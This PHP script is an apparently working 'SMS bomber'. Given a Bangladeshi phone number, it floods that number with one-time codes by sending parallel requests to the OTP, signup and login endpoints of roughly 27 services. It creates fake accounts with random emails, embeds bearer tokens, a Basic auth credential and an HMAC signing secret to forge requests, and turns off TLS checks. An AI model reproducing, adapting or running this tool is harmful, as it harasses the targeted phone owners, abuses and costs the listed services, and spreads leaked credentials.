<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 0); 
set_time_limit(0); 

// রেন্ডম ডাটা জেনারেটর
function genStr($l=8){return substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"),0,$l);}
function genEmail(){return genStr(7).rand(10,99)."@gmail.com";}

$phone = $_GET['phone'] ?? '';
if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)) die(json_encode(["error"=>"Invalid Number"]));

$p11 = preg_replace('/^\+?88/','',$phone);
if(substr($p11,0,1)!=="0") $p11="0".$p11;
$p88 = "88".$p11; $p_plus88 = "+88".$p11; $p_deepto = "+880".substr($p11,-10);
$p_osud = "+88-".$p11; $p_fun = substr($p11,1);

$apis = [];

// --- নতুন ১১টি (আপনার দেওয়া) ---
$apis[] = ["n"=>"shomvob","u"=>"https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0","m"=>"POST","d"=>["phone"=>$p11],"h"=>["Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s","Content-Type:application/json"]];
$apis[] = ["n"=>"circle","u"=>"https://reseller.circle.com.bd/api/v2/auth/signup","m"=>"POST","d"=>["name"=>$p_plus88,"email_or_phone"=>$p_plus88,"password"=>"12345678","password_confirmation"=>"12345678","register_by"=>"phone"],"h"=>["Content-Type:application/json"]];
$apis[] = ["n"=>"qcoom","u"=>"https://auth.qcoom.com/api/v1/otp/send","m"=>"POST","d"=>["mobileNumber"=>$p_plus88],"h"=>["Content-Type:application/json","Referer:https://qcoom.com/"]];
$apis[] = ["n"=>"chinaonline","u"=>"https://chinaonlineapi.com/api/v1/get/otp?phone=".$p11,"m"=>"GET","h"=>["token:gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219","Origin:https://chinaonlinebd.com"]];
$apis[] = ["n"=>"vnksrvc","u"=>"https://ucapi.vnksrvc.com/users/send_user_otp.json","m"=>"POST","d"=>["direct_login"=>true,"user"=>["login"=>$p88,"resend"=>false,"type"=>["register"=>true]]],"h"=>["Content-Type:application/json"]];
$apis[] = ["n"=>"caretutors","u"=>"https://api.caretutors.com/signup/guardian","m"=>"POST","d"=>["name"=>"Md Sajib","email"=>genEmail(),"phone"=>$p11,"password"=>"Pass12345","city_id"=>"14","location_id"=>"905","gender"=>"Male"],"h"=>["Authorization: Basic Y3RfYW5kcm9pZDokMnkkMTIkZWouREs1ckpJWmpGOUZva1RXRXJEZUR5bEE3Ti40YXB3MEZaMkZsbGNLNTNLRVlacURyeU8=","Content-Type:application/json"]];
$apis[] = ["n"=>"foodcollections","u"=>"https://foodcollections.com/api/v1/auth/sign-up","m"=>"POST","d"=>["f_name"=>genStr(5),"l_name"=>genStr(5),"phone"=>$p_plus88,"email"=>genEmail(),"password"=>"Pass12345"],"h"=>["Content-Type:application/json"]];
$apis[] = ["n"=>"prothomalo","u"=>"https://prod-api.viewlift.com/identity/otp/resend?site=prothomalo","m"=>"POST","d"=>["phoneNumber"=>$p_plus88,"applicationChannel"=>"WEB_APP"],"h"=>["Content-Type:application/json"]];
for($i=1;$i<=3;$i++) $apis[] = ["n"=>"betonbook_$i","u"=>"https://api.betonbook.com/api/v5/auth/otp/request","m"=>"POST","d"=>["phone"=>$p11,"language"=>1],"h"=>["Content-Type:application/json"]];
$apis[] = ["n"=>"moveon","u"=>"https://moveon.global/api/v1/customer/auth/phone/request-otp","m"=>"POST","d"=>["phone"=>$p11],"h"=>["Content-Type:application/json","Origin:https://moveon.com.bd","Referer:https://moveon.com.bd/"]];
$apis[] = ["n"=>"portpos","u"=>"https://payment.portpos.com/v2/api/user/signup-otp","m"=>"POST","d"=>["email_or_phone"=>$p11],"h"=>["Content-Type:application/json","User-Agent:Monibot"]];

// --- আগের ১৬টি (পুরনো ও সচল) ---
$apis[] = ["n"=>"ali2bd","u"=>"https://edge.ali2bd.com/api/consumer/v1/auth/login","m"=>"POST","d"=>["username"=>$p_plus88],"h"=>["Content-Type:application/json","Origin:https://ali2bd.com"]];
$ts = (string)time(); $sig = base64_encode(hash_hmac('sha256', $p_deepto.$ts, "UFNyP1f+s2bjwVAFbOBv87a142orsWLt7X/4M7pMVyE=", true));
$apis[] = ["n"=>"swap","u"=>"https://api.swap.com.bd/api/v1/send-otp/v2","m"=>"POST","d"=>["phone"=>$p_deepto,"timestamp"=>(int)$ts],"h"=>["Content-Type:application/json","signature:$sig"]];
$apis[] = ["n"=>"hishabee","u"=>"https://app.hishabee.business/api/V2/otp/send?mobile_number=$p11&country_code=88","m"=>"POST","h"=>["content-length:0","Origin:https://web.hishabee.business"]];
$apis[] = ["n"=>"osudpotro","u"=>"https://api.osudpotro.com/api/v1/users/send_otp","m"=>"POST","d"=>["mobile"=>$p_osud,"deviceToken"=>"web","os"=>"web"],"h"=>["Content-Type:application/json"]];
$apis[] = ["n"=>"apex4u","u"=>"https://api.apex4u.com/api/auth/login","m"=>"POST","d"=>["phoneNumber"=>$p11],"h"=>["Content-Type:application/json"]];
$apis[] = ["n"=>"fundesh","u"=>"https://fundesh.com.bd/api/auth/generateOTP?service_key=","m"=>"POST","d"=>["msisdn"=>$p_fun],"h"=>["Content-Type:application/json"]];
for($i=1;$i<=3;$i++){
    $apis[] = ["n"=>"pbs_$i","u"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP","m"=>"POST","d"=>["userPhone"=>$p11],"h"=>["Content-Type:application/json"]];
    $apis[] = ["n"=>"shadhin_$i","u"=>"https://connect.shadhinmusic.com/v1/api//otp/send","m"=>"POST","d"=>["msisdn"=>$p88],"h"=>["Content-Type:application/json"]];
    $apis[] = ["n"=>"redx_$i","u"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp","m"=>"POST","d"=>["phoneNumber"=>$p11],"h"=>["Content-Type:application/json"]];
    $apis[] = ["n"=>"bikroy_$i","u"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$p11","m"=>"GET"];
    $apis[] = ["n"=>"bdtickets_$i","u"=>"https://api.bdtickets.com:20100/v1/auth","m"=>"POST","d"=>["phoneNumber"=>$p_plus88,"applicationChannel"=>"WEB_APP"],"h"=>["Content-Type:application/json"]];
    $apis[] = ["n"=>"shwapno_$i","u"=>"https://www.shwapno.com/api/auth","m"=>"POST","d"=>["phoneNumber"=>$p_plus88],"h"=>["Content-Type:application/json"]];
    $apis[] = ["n"=>"garibook_$i","u"=>"https://api.garibookadmin.com/api/v4/user/login","m"=>"POST","d"=>["mobile"=>$p_plus88,"channel"=>"web"],"h"=>["Content-Type:application/json"]];
    $apis[] = ["n"=>"deeptoplay_$i","u"=>"https://api.deeptoplay.com/v2/auth/login?platform=web","m"=>"POST","d"=>["number"=>$p_deepto],"h"=>["Content-Type:application/json"]];
    $apis[] = ["n"=>"shikho_$i","u"=>"https://api.shikho.com/auth/v2/send/sms","m"=>"POST","d"=>["phone"=>$p88,"type"=>"student"],"h"=>["Content-Type:application/json"]];
    $apis[] = ["n"=>"iqra_$i","u"=>"https://apibeta.iqra-live.com/api/v2/sent-otp/".$p11,"m"=>"GET"];
}

// --- Multi-cURL Engine ---
$mh = curl_multi_init(); $hnd = [];
foreach($apis as $k=>$a){
    $ch = curl_init($a['u']);
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>1,CURLOPT_TIMEOUT=>20,CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0]);
    if(isset($a['h'])) curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($a['h'], ["User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]));
    if($a['m']=="POST"){
        curl_setopt($ch, CURLOPT_POST, 1);
        if(isset($a['d'])) curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($a['d']));
    }
    $hnd[$k]=$ch; curl_multi_add_handle($mh, $ch);
}
$r=null; do{curl_multi_exec($mh,$r);}while($r);
$res=[]; foreach($hnd as $k=>$c){$res[$apis[$k]['n']]=curl_getinfo($c,CURLINFO_HTTP_CODE); curl_multi_remove_handle($mh,$c); curl_close($c);}
curl_multi_close($mh);

echo json_encode(["status"=>"success","total_unique"=>27,"hits"=>count($apis),"results"=>$res], JSON_PRETTY_PRINT);
